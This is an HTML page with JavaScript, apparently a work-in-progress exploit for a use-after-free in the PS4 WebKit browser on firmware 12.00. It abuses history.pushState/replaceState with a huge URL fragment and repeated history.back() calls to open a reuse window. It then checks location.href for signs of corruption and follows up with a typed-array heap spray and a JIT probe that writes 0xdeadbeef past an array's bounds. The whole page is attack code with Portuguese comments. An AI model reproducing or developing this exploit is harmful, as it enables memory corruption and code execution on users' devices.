<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit FW12.00 — UAF Stable Trigger + Tests</title>
</head>
<body>

<h1>FW12.00 — UAF Stable Trigger (Mandatory)</h1>
<button onclick="run()">RUN TEST</button>
<pre id="log"></pre>

<script>
function log(s) {
    document.getElementById("log").textContent += s + "\n";
}

function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
}

/* ============================================================
   PHASE 0 — HARD RESET CONTEXT
   ============================================================ */
async function resetEnv() {
    history.replaceState({init:1}, "", "#INIT");
    await sleep(50);
}

/* ============================================================
   PHASE 1 — MANDATORY UAF TRIGGER (DO NOT TOUCH)
   ============================================================ */
async function triggerUAF() {
    log("=== UAF TRIGGER START ===");

    const BIG = "A".repeat(340356);   // valor já validado
    const SMALL = "X";

    // Estado A — fragmento grande
    history.pushState({A:1}, "", "#" + BIG);

    // Estado B — fragmento pequeno
    history.replaceState({B:2}, "", "#" + SMALL);

    // Janela crítica — reentrada
    for (let i = 0; i <= 42; i += 6) {
        history.back();
        await sleep(0);
        log("[ITER " + i + "] back() async");
    }

    log(">>> UAF WINDOW <<<");
}

/* ============================================================
   PHASE 2 — CONFIRMAÇÃO DE UAF (PRESSÃO REAL)
   ============================================================ */
function confirmUAF() {
    let s = location.href;

    log("");
    log("=== BASELINE READ ===");
    log("URL.length = " + s.length);
    log("charCodeAt(32) = " + s.charCodeAt(32));
    log("charCodeAt(64) = " + s.charCodeAt(64));
    log("charCodeAt(128) = " + s.charCodeAt(128));
    log("charCodeAt(256) = " + s.charCodeAt(256));

    // Heurística mínima: fragment colapsado + NaN
    if (s.length < 100 && isNaN(s.charCodeAt(64))) {
        log("=== UAF CONFIRMED ===");
        return true;
    }

    log("=== UAF NOT CONFIRMED — ABORTING TESTS ===");
    return false;
}

/* ============================================================
   PHASE 3 — TESTES (SÓ RODAM SE UAF EXISTIR)
   ============================================================ */
function testTypedArrays() {
    log("");
    log("=== TEST: TypedArray Slot Pressure ===");
    let arr = [];
    for (let i = 0; i < 6000; i++) {
        arr.push(new Uint32Array(8));
    }
    log("TypedArrays sprayed: " + arr.length);
}

function testJIT() {
    log("");
    log("=== TEST: JIT Probe ===");
    function jit(v) {
        let a = new Uint32Array(4);
        a[0] = v;
        return a[0];
    }
    for (let i = 0; i < 20000; i++) jit(i);

    let fake = new Uint32Array(4);
    fake.length = 4096;

    try {
        fake[16] = 0xdeadbeef;
        log("JIT write/read idx16 = 0x" + fake[16].toString(16));
    } catch (e) {
        log("JIT exception");
    }
}

function testHistoryState() {
    log("");
    log("=== TEST: History.state reuse ===");
    let st = history.state;
    log("typeof state = " + typeof st);
    log("JSON = " + JSON.stringify(st));
}

/* ============================================================
   MAIN
   ============================================================ */
async function run() {
    document.getElementById("log").textContent = "";
    await resetEnv();

    await triggerUAF();

    if (!confirmUAF())
        return;

    // Só aqui os testes começam
    testTypedArrays();
    testJIT();
    testHistoryState();

    log("");
    log("=== TEST END ===");
}
</script>

</body>
</html>
